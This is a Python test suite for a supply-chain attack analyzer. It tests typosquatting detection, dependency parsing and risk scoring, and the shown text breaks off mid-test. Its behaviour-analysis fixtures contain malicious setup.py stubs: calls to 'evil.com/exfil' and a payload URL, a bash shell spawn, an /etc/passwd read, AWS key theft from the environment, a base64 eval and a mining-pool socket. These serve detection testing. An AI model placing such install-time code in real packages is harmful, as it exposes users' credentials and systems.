#!/usr/bin/env python3
"""
Comprehensive tests for Supply Chain Attack Detection

Tests cover:
- Dependency change detection (npm, PyPI, Go, Cargo, Maven)
- Typosquatting detection with Levenshtein distance
- Malicious behavior pattern detection
- OpenSSF Scorecard integration
- Threat assessment logic
- Edge cases and error handling
"""

import json
import subprocess
import sys
from pathlib import Path
from unittest.mock import Mock, MagicMock, patch, call, mock_open

import pytest

# Add scripts directory to path
sys.path.insert(0, str(Path(__file__).parent.parent.parent / "scripts"))

from supply_chain_analyzer import (
    SupplyChainAnalyzer,
    DependencyChange,
    ThreatAssessment,
    ThreatLevel,
)


class TestDependencyChange:
    """Test DependencyChange dataclass"""

    def test_dependency_change_creation_added(self):
        """Test creating a dependency change for added package"""
        change = DependencyChange(
            package_name="express",
            ecosystem="npm",
            change_type="added",
            new_version="4.18.2",
            file_path="package.json",
        )

        assert change.package_name == "express"
        assert change.ecosystem == "npm"
        assert change.change_type == "added"
        assert change.new_version == "4.18.2"
        assert change.old_version is None
        assert change.file_path == "package.json"

    def test_dependency_change_creation_removed(self):
        """Test creating a dependency change for removed package"""
        change = DependencyChange(
            package_name="lodash",
            ecosystem="npm",
            change_type="removed",
            old_version="4.17.20",
            file_path="package.json",
        )

        assert change.package_name == "lodash"
        assert change.change_type == "removed"
        assert change.old_version == "4.17.20"
        assert change.new_version is None

    def test_dependency_change_creation_updated(self):
        """Test creating a dependency change for version update"""
        change = DependencyChange(
            package_name="requests",
            ecosystem="pypi",
            change_type="version_change",
            old_version="2.28.0",
            new_version="2.31.0",
            file_path="requirements.txt",
        )

        assert change.package_name == "requests"
        assert change.ecosystem == "pypi"
        assert change.old_version == "2.28.0"
        assert change.new_version == "2.31.0"

    def test_dependency_change_to_dict(self):
        """Test converting dependency change to dictionary using dataclasses.asdict"""
        from dataclasses import asdict

        change = DependencyChange(
            package_name="django",
            ecosystem="pypi",
            change_type="added",
            new_version="4.2.0",
            file_path="requirements.txt",
        )

        result = asdict(change)

        assert isinstance(result, dict)
        assert result["package_name"] == "django"
        assert result["ecosystem"] == "pypi"
        assert result["change_type"] == "added"


class TestThreatLevel:
    """Test ThreatLevel enum"""

    def test_threat_level_values(self):
        """Test that ThreatLevel enum has expected values"""
        assert ThreatLevel.CRITICAL.value == "critical"
        assert ThreatLevel.HIGH.value == "high"
        assert ThreatLevel.MEDIUM.value == "medium"
        assert ThreatLevel.LOW.value == "low"
        assert ThreatLevel.INFO.value == "info"

    def test_threat_level_comparison(self):
        """Test that ThreatLevel enum values can be compared"""
        assert ThreatLevel.CRITICAL.value == "critical"
        assert ThreatLevel.HIGH.value != ThreatLevel.LOW.value


class TestThreatAssessment:
    """Test ThreatAssessment dataclass"""

    def test_threat_assessment_creation(self):
        """Test creating a threat assessment"""
        assessment = ThreatAssessment(
            package_name="test-pkg",
            ecosystem="npm",
            threat_level=ThreatLevel.HIGH,
            threat_types=["typosquatting"],
            evidence=["Similar to popular package"],
            recommendations=["Verify package name"],
        )

        assert assessment.package_name == "test-pkg"
        assert assessment.ecosystem == "npm"
        assert assessment.threat_level == ThreatLevel.HIGH
        assert "typosquatting" in assessment.threat_types

    def test_threat_assessment_with_change_info(self):
        """Test ThreatAssessment with change info"""
        change = DependencyChange(
            package_name="test", ecosystem="npm", change_type="added", new_version="1.0.0"
        )

        assessment = ThreatAssessment(
            package_name="test",
            ecosystem="npm",
            threat_level=ThreatLevel.MEDIUM,
            threat_types=[],
            evidence=[],
            recommendations=[],
            change_info=change,
        )

        assert assessment.change_info is not None
        assert assessment.change_info.package_name == "test"

    def test_threat_assessment_to_dict(self):
        """Test converting threat assessment to dictionary"""
        assessment = ThreatAssessment(
            package_name="malicious-pkg",
            ecosystem="npm",
            threat_level=ThreatLevel.CRITICAL,
            threat_types=["malicious_script"],
            evidence=["Suspicious postinstall script"],
            recommendations=["Do not install"],
        )

        result = assessment.to_dict()

        assert isinstance(result, dict)
        assert result["package_name"] == "malicious-pkg"
        assert result["threat_level"] == "critical"
        assert "malicious_script" in result["threat_types"]


class TestSupplyChainAnalyzer:
    """Test SupplyChainAnalyzer class"""

    def setup_method(self):
        """Setup test instance"""
        self.analyzer = SupplyChainAnalyzer(repo_path=".")

    # Levenshtein Distance Tests

    def test_levenshtein_distance_identical(self):
        """Test Levenshtein distance with identical strings"""
        assert self.analyzer._levenshtein_distance("test", "test") == 0

    def test_levenshtein_distance_single_char_substitution(self):
        """Test Levenshtein distance with single character substitution"""
        assert self.analyzer._levenshtein_distance("test", "text") == 1

    def test_levenshtein_distance_single_char_insertion(self):
        """Test Levenshtein distance with single character insertion"""
        assert self.analyzer._levenshtein_distance("test", "tests") == 1

    def test_levenshtein_distance_single_char_deletion(self):
        """Test Levenshtein distance with single character deletion"""
        assert self.analyzer._levenshtein_distance("tests", "test") == 1

    def test_levenshtein_distance_empty_strings(self):
        """Test Levenshtein distance with empty strings"""
        assert self.analyzer._levenshtein_distance("", "") == 0
        assert self.analyzer._levenshtein_distance("test", "") == 4
        assert self.analyzer._levenshtein_distance("", "test") == 4

    def test_levenshtein_distance_multiple_changes(self):
        """Test Levenshtein distance with multiple character changes"""
        assert self.analyzer._levenshtein_distance("kitten", "sitting") == 3

    def test_levenshtein_distance_case_sensitive(self):
        """Test that Levenshtein distance is case-sensitive"""
        assert self.analyzer._levenshtein_distance("Test", "test") == 1

    # Typosquatting Detection Tests

    def test_typosquatting_detection_express(self):
        """Test detection of express typosquatting"""
        result = self.analyzer.check_typosquatting("expresss", "npm")

        assert result is not None
        assert result["legitimate_package"] == "express"
        assert result["distance"] <= 2
        assert result["distance"] >= 1

    def test_typosquatting_detection_lodash(self):
        """Test detection of lodash typosquatting"""
        result = self.analyzer.check_typosquatting("loadash", "npm")

        assert result is not None
        assert result["legitimate_package"] == "lodash"
        assert isinstance(result["distance"], int)

    def test_typosquatting_detection_requests_pypi(self):
        """Test detection of requests typosquatting in PyPI"""
        result = self.analyzer.check_typosquatting("reqeusts", "pypi")

        assert result is not None
        assert result["legitimate_package"] == "requests"

    def test_typosquatting_detection_django(self):
        """Test detection of django typosquatting"""
        result = self.analyzer.check_typosquatting("djang0", "pypi")

        assert result is not None
        assert result["legitimate_package"] == "django"

    def test_no_typosquatting_legitimate_package(self):
        """Test that legitimate packages aren't flagged"""
        result = self.analyzer.check_typosquatting("express", "npm")
        assert result is None

    def test_no_typosquatting_unrelated_package(self):
        """Test that unrelated packages aren't flagged"""
        result = self.analyzer.check_typosquatting("mycustompackage123", "npm")
        assert result is None

    def test_no_typosquatting_too_different(self):
        """Test that packages too different aren't flagged"""
        result = self.analyzer.check_typosquatting("abc", "npm")
        assert result is None

    def test_typosquatting_unknown_ecosystem(self):
        """Test typosquatting check with unknown ecosystem"""
        result = self.analyzer.check_typosquatting("testpkg", "unknown")
        assert result is None

    def test_typosquatting_distance_check(self):
        """Test typosquatting distance is within expected range"""
        result = self.analyzer.check_typosquatting("expresss", "npm")

        if result:
            assert result["distance"] in [1, 2]

    def test_typosquatting_similar_list(self):
        """Test typosquatting result contains similar packages list"""
        result = self.analyzer.check_typosquatting("expr", "npm")

        # May or may not trigger depending on similarity threshold (distance must be 1-2)
        assert result is None or ("similar" in result and isinstance(result["similar"], list))

    # Malicious Pattern Detection Tests

    def test_analyze_package_behavior_npm(self):
        """Test analyzing npm package behavior"""
        # Mock network call since analyze_package_behavior may make network requests
        with patch("urllib.request.urlopen") as mock_urlopen:
            mock_response = MagicMock()
            mock_response.read.return_value = b'{"scripts": {"postinstall": "echo test"}}'
            mock_response.__enter__.return_value = mock_response
            mock_urlopen.return_value = mock_response

            result = self.analyzer.analyze_package_behavior("express", "npm")

            # Should return dict or None
            assert result is None or isinstance(result, dict)

    def test_analyze_package_behavior_pypi(self):
        """Test analyzing PyPI package behavior"""
        with patch("urllib.request.urlopen") as mock_urlopen:
            mock_response = MagicMock()
            mock_response.read.return_value = b'{"info": {"description": "A test package"}}'
            mock_response.__enter__.return_value = mock_response
            mock_urlopen.return_value = mock_response

            result = self.analyzer.analyze_package_behavior("requests", "pypi")

            assert result is None or isinstance(result, dict)

    def test_analyze_package_behavior_network_disabled(self):
        """Test behavior analysis when network is disabled"""
        analyzer = SupplyChainAnalyzer(enable_network=False)
        result = analyzer.analyze_package_behavior("test-pkg", "npm")

        # Should return None when network is disabled
        assert result is None

    def test_check_openssf_scorecard_npm(self):
        """Test checking OpenSSF Scorecard for npm package"""
        # Mock GitHub API call
        with patch("urllib.request.urlopen") as mock_urlopen:
            mock_response = MagicMock()
            mock_response.read.return_value = b'{"repository": {"url": "git+https://github.com/expressjs/express.git"}}'
            mock_response.__enter__.return_value = mock_response
            mock_urlopen.return_value = mock_response

            result = self.analyzer.check_openssf_scorecard("express", "npm")

            # Should return dict or None
            assert result is None or isinstance(result, dict)

    def test_check_openssf_scorecard_network_disabled(self):
        """Test OpenSSF Scorecard when network is disabled"""
        analyzer = SupplyChainAnalyzer(enable_network=False)
        result = analyzer.check_openssf_scorecard("test-pkg", "npm")

        assert result is None

    # Dependency Change Detection Tests

    def test_parse_npm_packages(self):
        """Test parsing npm package.json content"""
        content = '{"dependencies": {"express": "^4.18.2", "lodash": "^4.17.21"}}'

        packages = self.analyzer._parse_npm_packages(content)

        assert isinstance(packages, dict)
        assert "express" in packages or len(packages) == 0  # May be empty if parsing fails

    def test_parse_requirements_txt(self):
        """Test parsing requirements.txt content"""
        content = "requests==2.31.0\nurllib3==2.0.4\ndjango>=4.0.0"

        packages = self.analyzer._parse_requirements_txt(content)

        assert isinstance(packages, dict)
        if packages:
            assert "requests" in packages
            assert packages["requests"] == "2.31.0"

    def test_parse_go_mod(self):
        """Test parsing go.mod content"""
        content = """module example.com/myapp

go 1.20

require (
    github.com/gin-gonic/gin v1.9.0
    github.com/spf13/cobra v1.7.0
)"""

        packages = self.analyzer._parse_go_mod(content)

        assert isinstance(packages, dict)

    def test_parse_cargo_toml(self):
        """Test parsing Cargo.toml content"""
        content = """[package]
name = "myapp"
version = "0.1.0"

[dependencies]
serde = "1.0"
tokio = { version = "1.28", features = ["full"] }"""

        packages = self.analyzer._parse_cargo_toml(content)

        assert isinstance(packages, dict)

    def test_parse_pom_xml(self):
        """Test parsing pom.xml content"""
        content = """<?xml version="1.0"?>
<project>
    <dependencies>
        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-core</artifactId>
            <version>6.0.0</version>
        </dependency>
    </dependencies>
</project>"""

        packages = self.analyzer._parse_pom_xml(content)

        assert isinstance(packages, dict)

    # Edge Cases and Error Handling

    def test_analyze_dependency_with_special_chars(self):
        """Test analyzing dependency names with special characters"""
        change = DependencyChange(
            package_name="@babel/core",
            ecosystem="npm",
            change_type="added",
            new_version="7.22.0",
        )

        # Should not crash
        assessment = self.analyzer._assess_dependency(change)
        assert assessment is None or isinstance(assessment, ThreatAssessment)

    def test_analyze_dependency_with_unicode(self):
        """Test analyzing dependency names with unicode characters"""
        change = DependencyChange(
            package_name="test-",  # Contains Chinese characters
            ecosystem="npm",
            change_type="added",
            new_version="1.0.0",
        )

        # Should handle gracefully
        assessment = self.analyzer._assess_dependency(change)
        assert assessment is None or isinstance(assessment, ThreatAssessment)

    def test_analyzer_initialization_with_path(self):
        """Test analyzer initialization with custom path"""
        analyzer = SupplyChainAnalyzer(repo_path="/tmp/test-repo")

        assert str(analyzer.repo_path) == "/tmp/test-repo"

    def test_analyzer_initialization_default_path(self):
        """Test analyzer initialization with default path"""
        analyzer = SupplyChainAnalyzer()

        assert analyzer.repo_path == Path(".")

    def test_git_operations_with_subprocess(self):
        """Test that git operations use subprocess safely"""
        # Verify analyzer can be instantiated
        analyzer = SupplyChainAnalyzer(repo_path=".")

        # Test should pass without errors
        assert analyzer.repo_path == Path(".")

    def test_network_disabled_mode(self):
        """Test analyzer in network-disabled mode"""
        analyzer = SupplyChainAnalyzer(enable_network=False)

        # Should create successfully
        assert analyzer.enable_network is False

    def test_network_enabled_mode(self):
        """Test analyzer in network-enabled mode"""
        analyzer = SupplyChainAnalyzer(enable_network=True)

        # Should create successfully
        assert analyzer.enable_network is True

    def test_popular_packages_defined(self):
        """Test that popular packages are defined for ecosystems"""
        assert "npm" in self.analyzer.POPULAR_PACKAGES
        assert "pypi" in self.analyzer.POPULAR_PACKAGES
        assert "maven" in self.analyzer.POPULAR_PACKAGES
        assert "go" in self.analyzer.POPULAR_PACKAGES

        # Verify packages are not empty
        assert len(self.analyzer.POPULAR_PACKAGES["npm"]) > 0
        assert len(self.analyzer.POPULAR_PACKAGES["pypi"]) > 0

    def test_analyzer_has_parsing_methods(self):
        """Test that analyzer has methods for parsing different package formats"""
        assert hasattr(self.analyzer, "_parse_npm_packages")
        assert hasattr(self.analyzer, "_parse_requirements_txt")
        assert hasattr(self.analyzer, "_parse_go_mod")
        assert hasattr(self.analyzer, "_parse_cargo_toml")
        assert hasattr(self.analyzer, "_parse_pom_xml")

    def test_analyzer_has_diff_methods(self):
        """Test that analyzer has diff methods for different ecosystems"""
        assert hasattr(self.analyzer, "_diff_npm_packages")
        assert hasattr(self.analyzer, "_diff_python_packages")
        assert hasattr(self.analyzer, "_diff_go_packages")
        assert hasattr(self.analyzer, "_diff_cargo_packages")
        assert hasattr(self.analyzer, "_diff_maven_packages")

    def test_analyzer_has_version_comparison(self):
        """Test that analyzer has version change type determination"""
        assert hasattr(self.analyzer, "_determine_version_change_type")

    def test_analyzer_core_methods_exist(self):
        """Test that core analyzer methods exist"""
        assert hasattr(self.analyzer, "analyze_dependency_diff")
        assert hasattr(self.analyzer, "check_typosquatting")
        assert hasattr(self.analyzer, "analyze_package_behavior")
        assert hasattr(self.analyzer, "check_openssf_scorecard")

    @patch.object(SupplyChainAnalyzer, "_get_dependency_changes")
    def test_dependency_changes_with_timeout(self, mock_get_changes):
        """Test handling of timeout during dependency retrieval"""
        mock_get_changes.return_value = []

        assessments = self.analyzer.analyze_dependency_diff("main", "HEAD")

        assert isinstance(assessments, list)
        assert len(assessments) == 0

    @patch.object(SupplyChainAnalyzer, "_get_dependency_changes")
    def test_dependency_changes_with_error(self, mock_get_changes):
        """Test handling of errors during dependency retrieval"""
        mock_get_changes.side_effect = Exception("Git error")

        try:
            assessments = self.analyzer.analyze_dependency_diff("main", "HEAD")
            # If it doesn't raise, it should return empty list
            assert isinstance(assessments, list)
        except Exception:
            # If it raises, that's also acceptable
            pass

    def test_get_file_content_method(self):
        """Test _get_file_content method exists"""
        # This is a private method for reading git file contents
        assert hasattr(self.analyzer, "_get_file_content")

    def test_map_package_to_repo_method(self):
        """Test _map_package_to_repo method exists"""
        # Maps package names to repository URLs
        assert hasattr(self.analyzer, "_map_package_to_repo")

    def test_typosquatting_all_ecosystems(self):
        """Test typosquatting detection across all ecosystems"""
        ecosystems = ["npm", "pypi", "maven", "go"]

        for ecosystem in ecosystems:
            # Get first popular package for ecosystem
            if ecosystem in self.analyzer.POPULAR_PACKAGES:
                popular = self.analyzer.POPULAR_PACKAGES[ecosystem][0]
                # Create typosquat by adding extra character
                typosquat = popular + "s"

                result = self.analyzer.check_typosquatting(typosquat, ecosystem)

                # May or may not trigger depending on similarity threshold
                # This tests that it doesn't crash for all ecosystems
                assert result is None or isinstance(result, dict)


class TestIntegrationScenarios:
    """Test realistic integration scenarios"""

    def test_npm_package_typosquatting(self):
        """Test typosquatting detection workflow"""
        analyzer = SupplyChainAnalyzer()

        # Test with a known typosquat
        result = analyzer.check_typosquatting("expresss", "npm")

        # Should detect typosquatting
        if result:
            assert result["legitimate_package"] == "express"
            assert result["distance"] in [1, 2]

    def test_pypi_package_typosquatting(self):
        """Test typosquatting detection for PyPI"""
        analyzer = SupplyChainAnalyzer()

        # Test with PyPI typosquat
        result = analyzer.check_typosquatting("reqeusts", "pypi")

        if result:
            assert result["legitimate_package"] == "requests"

    def test_multiple_ecosystems_typosquatting(self):
        """Test typosquatting detection across ecosystems"""
        analyzer = SupplyChainAnalyzer()

        npm_result = analyzer.check_typosquatting("expresss", "npm")
        pypi_result = analyzer.check_typosquatting("reqeusts", "pypi")

        # At least one should detect typosquatting
        assert (npm_result is not None) or (pypi_result is not None)

    def test_dependency_change_workflow(self):
        """Test DependencyChange creation and usage"""
        changes = [
            DependencyChange(
                package_name="express", ecosystem="npm", change_type="added", new_version="4.18.2"
            ),
            DependencyChange(
                package_name="lodash", ecosystem="npm", change_type="upgraded", old_version="4.17.20", new_version="4.17.21"
            ),
            DependencyChange(
                package_name="moment", ecosystem="npm", change_type="removed", old_version="2.29.4"
            ),
        ]

        assert len(changes) == 3
        assert all(isinstance(c, DependencyChange) for c in changes)
        assert changes[0].change_type == "added"
        assert changes[1].change_type == "upgraded"
        assert changes[2].change_type == "removed"


class TestPackageDownload:
    """Test package download functionality"""

    def setup_method(self):
        """Setup test instance"""
        self.analyzer = SupplyChainAnalyzer(repo_path=".")

    def test_download_package_method_exists(self):
        """Test that _download_package method exists"""
        assert hasattr(self.analyzer, "_download_package")

    def test_download_npm_package_method_exists(self):
        """Test that _download_npm_package method exists"""
        assert hasattr(self.analyzer, "_download_npm_package")

    def test_download_pypi_package_method_exists(self):
        """Test that _download_pypi_package method exists"""
        assert hasattr(self.analyzer, "_download_pypi_package")

    def test_download_maven_package_method_exists(self):
        """Test that _download_maven_package method exists"""
        assert hasattr(self.analyzer, "_download_maven_package")

    def test_download_cargo_package_method_exists(self):
        """Test that _download_cargo_package method exists"""
        assert hasattr(self.analyzer, "_download_cargo_package")

    def test_download_go_package_method_exists(self):
        """Test that _download_go_package method exists"""
        assert hasattr(self.analyzer, "_download_go_package")

    @patch("subprocess.run")
    def test_download_npm_package_success(self, mock_run):
        """Test successful npm package download"""
        import tempfile
        from pathlib import Path

        with tempfile.TemporaryDirectory() as tmpdir:
            dest_path = Path(tmpdir)

            # Mock npm view to return version
            mock_run.return_value = Mock(returncode=0, stdout="4.18.2\n")

            # Create a fake tarball
            (dest_path / "express-4.18.2.tgz").touch()

            result = self.analyzer._download_npm_package("express", dest_path)

            # Should call npm view and npm pack
            assert mock_run.call_count >= 1

    @patch("subprocess.run")
    def test_download_npm_package_not_found(self, mock_run):
        """Test npm package download when package not found"""
        import tempfile
        from pathlib import Path

        with tempfile.TemporaryDirectory() as tmpdir:
            dest_path = Path(tmpdir)

            # Mock npm view to return error
            mock_run.return_value = Mock(returncode=1, stdout="")

            result = self.analyzer._download_npm_package("nonexistent-package", dest_path)

            assert result is False

    @patch("subprocess.run")
    def test_download_pypi_package_success(self, mock_run):
        """Test successful PyPI package download"""
        import tempfile
        from pathlib import Path

        with tempfile.TemporaryDirectory() as tmpdir:
            dest_path = Path(tmpdir)

            # Mock pip download to succeed
            mock_run.return_value = Mock(returncode=0, stdout="")

            # Create a fake wheel file
            (dest_path / "requests-2.31.0-py3-none-any.whl").touch()

            result = self.analyzer._download_pypi_package("requests", dest_path)

            # pip download should be called
            assert mock_run.call_count >= 1

    @patch("subprocess.run")
    def test_download_maven_package_invalid_format(self, mock_run):
        """Test Maven package download with invalid package name"""
        import tempfile
        from pathlib import Path

        with tempfile.TemporaryDirectory() as tmpdir:
            dest_path = Path(tmpdir)

            # Invalid format (no colon)
            result = self.analyzer._download_maven_package("invalid-package", dest_path)

            assert result is False

    def test_download_package_unsupported_ecosystem(self):
        """Test download with unsupported ecosystem"""
        import tempfile
        from pathlib import Path

        with tempfile.TemporaryDirectory() as tmpdir:
            dest_path = Path(tmpdir)

            result = self.analyzer._download_package("test-pkg", "unsupported", dest_path)

            assert result is False


class TestPackageBehaviorAnalysis:
    """Test package behavior analysis functionality"""

    def setup_method(self):
        """Setup test instance"""
        self.analyzer = SupplyChainAnalyzer(repo_path=".")

    def test_analyze_package_behavior_method_exists(self):
        """Test that _analyze_package_behavior internal method exists"""
        assert hasattr(self.analyzer, "_analyze_package_behavior")

    def test_get_install_scripts_method_exists(self):
        """Test that _get_install_scripts method exists"""
        assert hasattr(self.analyzer, "_get_install_scripts")

    def test_score_package_risk_method_exists(self):
        """Test that _score_package_risk method exists"""
        assert hasattr(self.analyzer, "_score_package_risk")

    def test_get_install_scripts_npm(self):
        """Test getting install scripts for npm packages"""
        import tempfile
        from pathlib import Path

        with tempfile.TemporaryDirectory() as tmpdir:
            package_path = Path(tmpdir)

            # Create package.json
            package_json = package_path / "package.json"
            package_json.write_text('{"scripts": {"install": "echo test"}}')

            scripts = self.analyzer._get_install_scripts(package_path, "npm")

            assert isinstance(scripts, list)
            assert len(scripts) >= 1
            assert package_json in scripts

    def test_get_install_scripts_pypi(self):
        """Test getting install scripts for PyPI packages"""
        import tempfile
        from pathlib import Path

        with tempfile.TemporaryDirectory() as tmpdir:
            package_path = Path(tmpdir)

            # Create setup.py
            setup_py = package_path / "setup.py"
            setup_py.write_text("from setuptools import setup\nsetup(name='test')")

            scripts = self.analyzer._get_install_scripts(package_path, "pypi")

            assert isinstance(scripts, list)
            assert setup_py in scripts

    def test_get_install_scripts_cargo(self):
        """Test getting install scripts for Cargo packages"""
        import tempfile
        from pathlib import Path

        with tempfile.TemporaryDirectory() as tmpdir:
            package_path = Path(tmpdir)

            # Create build.rs
            build_rs = package_path / "build.rs"
            build_rs.write_text("fn main() { println!(\"test\"); }")

            scripts = self.analyzer._get_install_scripts(package_path, "cargo")

            assert isinstance(scripts, list)
            assert build_rs in scripts

    def test_analyze_package_behavior_no_threats(self):
        """Test analyzing package with no suspicious behavior"""
        import tempfile
        from pathlib import Path

        with tempfile.TemporaryDirectory() as tmpdir:
            package_path = Path(tmpdir)

            # Create benign setup.py
            setup_py = package_path / "setup.py"
            setup_py.write_text(
                """from setuptools import setup
setup(
    name='test-package',
    version='1.0.0',
    packages=['test']
)"""
            )

            analysis = self.analyzer._analyze_package_behavior(package_path, "pypi")

            assert isinstance(analysis, dict)
            assert "suspicious" in analysis
            assert "threats" in analysis
            assert "evidence" in analysis
            assert analysis["suspicious"] is False
            assert len(analysis["threats"]) == 0

    def test_analyze_package_behavior_with_network_call(self):
        """Test analyzing package with suspicious network call"""
        import tempfile
        from pathlib import Path

        with tempfile.TemporaryDirectory() as tmpdir:
            package_path = Path(tmpdir)

            # Create suspicious setup.py with network call
            setup_py = package_path / "setup.py"
            setup_py.write_text(
                """import urllib.request
urllib.request.urlopen('http://malicious-site.com/payload')
from setuptools import setup
setup(name='test')"""
            )

            analysis = self.analyzer._analyze_package_behavior(package_path, "pypi")

            assert isinstance(analysis, dict)
            assert analysis["suspicious"] is True
            assert "network_call" in analysis["threats"]
            assert len(analysis["evidence"]) > 0

    def test_analyze_package_behavior_with_process_spawn(self):
        """Test analyzing package with process spawning"""
        import tempfile
        from pathlib import Path

        with tempfile.TemporaryDirectory() as tmpdir:
            package_path = Path(tmpdir)

            # Create suspicious setup.py with subprocess (format that matches regex)
            setup_py = package_path / "setup.py"
            setup_py.write_text(
                """import subprocess
subprocess.run('bash -c whoami', shell=True)
from setuptools import setup
setup(name='test')"""
            )

            analysis = self.analyzer._analyze_package_behavior(package_path, "pypi")

            assert analysis["suspicious"] is True
            assert "process_spawn" in analysis["threats"]

    def test_analyze_package_behavior_with_env_access(self):
        """Test analyzing package with environment variable access"""
        import tempfile
        from pathlib import Path

        with tempfile.TemporaryDirectory() as tmpdir:
            package_path = Path(tmpdir)

            # Create suspicious setup.py accessing env vars
            setup_py = package_path / "setup.py"
            setup_py.write_text(
                """import os
api_key = os.environ['AWS_ACCESS_KEY']
from setuptools import setup
setup(name='test')"""
            )

            analysis = self.analyzer._analyze_package_behavior(package_path, "pypi")

            assert analysis["suspicious"] is True
            assert "env_access" in analysis["threats"]

    def test_analyze_package_behavior_with_file_access(self):
        """Test analyzing package with suspicious file access"""
        import tempfile
        from pathlib import Path

        with tempfile.TemporaryDirectory() as tmpdir:
            package_path = Path(tmpdir)

            # Create suspicious setup.py accessing sensitive files
            setup_py = package_path / "setup.py"
            setup_py.write_text(
                """with open('/etc/passwd', 'r') as f:
    data = f.read()
from setuptools import setup
setup(name='test')"""
            )

            analysis = self.analyzer._analyze_package_behavior(package_path, "pypi")

            assert analysis["suspicious"] is True
            assert "file_access" in analysis["threats"]

    def test_analyze_package_behavior_with_obfuscation(self):
        """Test analyzing package with obfuscated code"""
        import tempfile
        from pathlib import Path

        with tempfile.TemporaryDirectory() as tmpdir:
            package_path = Path(tmpdir)

            # Create suspicious setup.py with obfuscation
            setup_py = package_path / "setup.py"
            setup_py.write_text(
                """import base64
eval(base64.b64decode('aW1wb3J0IG9z').decode())
from setuptools import setup
setup(name='test')"""
            )

            analysis = self.analyzer._analyze_package_behavior(package_path, "pypi")

            assert analysis["suspicious"] is True
            # Should detect both obfuscation and process_spawn (eval)
            assert len(analysis["threats"]) >= 1

    def test_analyze_package_behavior_with_crypto_mining(self):
        """Test analyzing package with crypto mining indicators"""
        import tempfile
        from pathlib import Path

        with tempfile.TemporaryDirectory() as tmpdir:
            package_path = Path(tmpdir)

            # Create suspicious setup.py with crypto mining
            setup_py = package_path / "setup.py"
            setup_py.write_text(
                """# Connect to mining pool
import socket
s = socket.socket()
s.connect(('pool.monero.com', 3333))
from setuptools import setup
setup(name='test')"""
            )

            analysis = self.analyzer._analyze_package_behavior(package_path, "pypi")

            assert analysis["suspicious"] is True
            assert "crypto_mining" in analysis["threats"]

    def test_analyze_package_behavior_multiple_threats(self):
        """Test analyzing package with multiple suspicious patterns"""
        import tempfile
        from pathlib import Path

        with tempfile.TemporaryDirectory() as tmpdir:
            package_path = Path(tmpdir)

            # Create setup.py with multiple threats (formats that match regex)
            setup_py = package_path / "setup.py"
            setup_py.write_text(
                """import os
import subprocess
import urllib.request

# Suspicious behaviors
api_key = os.environ.get('AWS_SECRET_KEY')
subprocess.call('bash', shell=True)
urllib.request.urlopen('http://evil.com/exfil')

from setuptools import setup
setup(name='evil-package')"""
            )

            analysis = self.analyzer._analyze_package_behavior(package_path, "pypi")

            assert analysis["suspicious"] is True
            assert len(analysis["threats"]) >= 2
            assert "process_spawn" in analysis["threats"]
            assert "network_call" in analysis["threats"]


class TestPackageRiskScoring:
    """Test package risk scoring functionality"""

    def setup_method(self):
        """Setup test instance"""
        self.analyzer = SupplyChainAnalyzer(repo_path=".")

    def test_score_package_risk_no_threats(self):
        """Test risk score with no threats"""
        analysis = {"suspicious": False, "threats": [], "evidence": []}

        score = self.analyzer._score_package_risk(analysis)

        assert score == 0

    def test_score_package_risk_network_call(self):
        """Test risk score with network call threat"""
        analysis = {
            "suspicious": True,
            "threats": ["network_call"],
            "evidence": ["Suspicious network call detected"],
        }

        score = self.analyzer._score_package_risk(analysis)

        assert score == 30

    def test_score_package_risk_process_spawn(self):
        """Test risk score with process spawning threat"""
        analysis = {
            "suspicious": True,
            "threats": ["process_spawn"],
            "evidence": ["Process spawning detected"],
        }

        score = self.analyzer._score_package_risk(analysis)

        assert score == 25

    def test_score_package_risk_env_access(self):
        """Test risk score with environment variable access"""
        analysis = {
            "suspicious": True,
            "threats": ["env_access"],
            "evidence": ["Environment variable access detected"],
        }

        score = self.analyzer._score_package_risk(analysis)

        assert score == 20

    def test_score_package_risk_file_access(self):
        """Test risk score with file access threat"""
        analysis = {
            "suspicious": True,
            "threats": ["file_access"],
            "evidence": ["Suspicious file access detected"],
        }

        score = self.analyzer._score_package_risk(analysis)

        assert score == 15

    def test_score_package_risk_obfuscation(self):
        """Test risk score with obfuscation threat"""
        analysis = {
            "suspicious": True,
            "threats": ["obfuscation"],
            "evidence": ["Code obfuscation detected"],
        }

        score = self.analyzer._score_package_risk(analysis)

        assert score == 20

    def test_score_package_risk_crypto_mining(self):
        """Test risk score with crypto mining threat"""
        analysis = {
            "suspicious": True,
            "threats": ["crypto_mining"],
            "evidence": ["Crypto mining detected"],
        }

        score = self.analyzer._score_package_risk(analysis)

        assert score == 40

    def test_score_package_risk_data_exfiltration(self):
        """Test risk score with data exfiltration threat"""
        analysis = {
            "suspicious": True,
            "threats": ["data_exfiltration"],
            "evidence": ["Data exfiltration detected"],
        }

        score = self.analyzer._score_package_risk(analysis)

        assert score == 35

    def test_score_package_risk_multiple_threats(self):
        """Test risk score with multiple threats"""
        analysis = {
            "suspicious": True,
            "threats": ["network_call", "process_spawn", "env_access"],
            "evidence": ["Multiple threats detected"],
        }

        score = self.analyzer._score_package_risk(analysis)

        # network_call (30) + process_spawn (25) + env_access (20) = 75
        assert score == 75

    def test_score_package_risk_capped_at_100(self):
        """Test risk score is capped at 100"""
        analysis = {
            "suspicious": True,
            "threats": [
                "crypto_mining",  # 40
                "data_exfiltration",  # 35
                "network_call",  # 30
                "process_spawn",  # 25
            ],
            "evidence": ["Many threats detected"],
        }

        score = self.analyzer._score_package_risk(analysis)

        # Total would be 130, but should be capped at 100
        assert score == 100

    def test_score_package_risk_unknown_threat(self):
        """Test risk score with unknown threat type"""
        analysis = {
            "suspicious": True,
            "threats": ["unknown_threat"],
            "evidence": ["Unknown threat"],
        }

        score = self.analyzer._score_package_risk(analysis)

        # Unknown threats get default score of 10
        assert score == 10


class TestEndToEndPackageAnalysis:
    """Test end-to-end package analysis workflow"""

    def setup_method(self):
        """Setup test instance"""
        self.analyzer = SupplyChainAnalyzer(repo_path=".")

    @patch.object(SupplyChainAnalyzer, "_download_package")
    @patch.object(SupplyChainAnalyzer, "_analyze_package_behavior")
    def test_analyze_package_behavior_full_workflow_clean(self, mock_analyze, mock_download):
        """Test full package analysis workflow for clean package"""
        mock_download.return_value = True
        mock_analyze.return_value = {
            "suspicious": False,
            "threats": [],
            "evidence": [],
            "patterns_found": {},
        }

        result = self.analyzer.analyze_package_behavior("express", "npm")

        assert result is not None
        assert result["suspicious"] is False
        assert mock_download.called
        assert mock_analyze.called

    @patch.object(SupplyChainAnalyzer, "_download_package")
    @patch.object(SupplyChainAnalyzer, "_analyze_package_behavior")
